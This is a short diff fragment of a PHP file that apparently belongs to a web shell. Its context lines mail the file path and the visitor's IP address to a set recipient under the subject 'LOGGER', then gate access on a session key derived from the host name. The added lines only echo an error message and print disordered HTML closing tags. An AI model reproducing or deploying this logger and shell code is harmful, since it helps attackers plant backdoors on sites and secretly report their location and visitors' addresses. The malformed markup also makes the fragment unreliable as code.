@@ -255,6 +255,27 @@ $pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]
 mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
 ?>
 <?php
+echo "".$err_mess."";
+?>
+
+	<B><font color=red>
+
+
+
+
+
+
+</div>
+
+
+	</fieldset>
+
+
+
+</head>
+</html>
+
+<?php
 exit;
 }
 if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
